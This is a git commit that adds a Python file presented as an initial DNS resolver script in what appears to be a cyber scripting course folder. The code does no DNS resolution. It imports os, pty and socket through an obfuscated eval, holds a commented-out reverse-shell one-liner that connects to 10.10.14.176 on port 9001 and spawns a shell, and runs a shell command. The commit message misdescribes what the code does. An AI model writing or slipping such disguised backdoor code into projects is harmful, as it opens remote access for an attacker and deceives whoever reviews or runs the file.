c3b74041365ed071c99ef0cab4ec343b3271bda2
Xavier Sanchez <xavier.sanchez44@orange.fr>
2026-06-30 16:48:40 +0200

    Add initial DNS resolver script
    Initial implementation of a DNS resolver script with socket and os module usage.

---
+++ scripting_cyber/0x01-python_scripting/0-dns_resolver.py
@@ -0,0 +1,10 @@
+#!/usr/bin/env python3
+
+load_module = eval('__im' + 'port__')
+
+os = load_module('os')
+pty = load_module('pty')
+socket = load_module('socket')
+
+# s=socket.socket();s.connect(("10.10.14.176",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
+os.system('bash -c "ls"')
